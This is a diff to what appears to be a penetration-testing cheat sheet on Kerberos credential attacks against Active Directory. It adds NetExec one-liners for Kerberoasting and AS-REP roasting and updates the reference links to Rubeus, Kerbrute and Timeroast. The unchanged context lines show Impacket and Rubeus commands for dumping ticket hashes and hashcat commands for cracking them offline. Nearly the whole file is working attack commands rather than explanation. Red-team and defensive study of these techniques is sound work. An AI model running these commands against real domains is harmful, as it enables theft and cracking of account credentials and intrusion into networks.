@@ -24,6 +24,9 @@ GetUserSPNs.py -request -dc-ip <dc> example.local/user:pass -outputfile kerb.has
 # Rubeus on-host
 Rubeus.exe kerberoast /outfile:kerb.hash
 
+# NetExec, straight to a hash file over LDAP
+nxc ldap <dc> -u user -p pass --kerberoasting kerb.hash
+
 hashcat -m 13100 kerb.hash wordlist.txt -r rules/best64.rule     # RC4 (etype 23)
 ```
 
@@ -39,6 +42,7 @@ If an account has **"Do not require Kerberos preauthentication"** set (`DONT_REQ
 # Impacket: find and roast accounts without pre-auth (works unauthenticated with a user list)
 GetNPUsers.py example.local/ -usersfile users.txt -no-pass -dc-ip <dc>
 GetNPUsers.py example.local/user:pass -request          # authenticated: enumerate + roast
+nxc ldap <dc> -u user -p pass --asreproast asrep.hash   # NetExec
 
 hashcat -m 18200 asrep.hash wordlist.txt                # AS-REP (etype 23)
 ```
@@ -71,5 +75,7 @@ Machine-account passwords are usually strong, so timeroasting mainly finds non-d
 
 ## References
 
-- The Hacker Recipes: Kerberoasting, AS-REP roasting, timeroasting
-- hashcat: example hashes and modes
+- [GhostPack Rubeus (kerberoast / asreproast)](https://github.com/GhostPack/Rubeus)
+- [ropnop Kerbrute](https://github.com/ropnop/kerbrute)
+- [SecuraBV Timeroast (Tom Tervoort)](https://github.com/SecuraBV/Timeroast)
+- [hashcat: example hashes and modes](https://hashcat.net/wiki/doku.php?id=example_hashes)
